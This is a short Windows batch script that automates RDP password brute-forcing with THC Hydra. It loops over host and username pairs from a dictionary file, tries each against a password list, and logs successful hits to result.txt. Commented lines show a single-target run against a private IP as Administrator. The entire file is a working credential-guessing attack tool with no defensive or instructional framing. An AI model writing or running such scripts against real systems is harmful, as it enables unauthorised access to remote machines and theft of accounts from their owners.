@echo off

for /f "tokens=1* delims=' " %%a in (~\rdp_dict.txt) do (
echo %%a
echo %%b
~\hydra.exe -l %%b -P ~\pass.txt %%a rdp |find "host" >> ~\result.txt
)


::.\hydra.exe -l Administrator -P pass.txt 192.168.5.128 rdp >> output.txt
:: >> E:\tools\scan\thc-hydra-windows-v9.1\output.txt 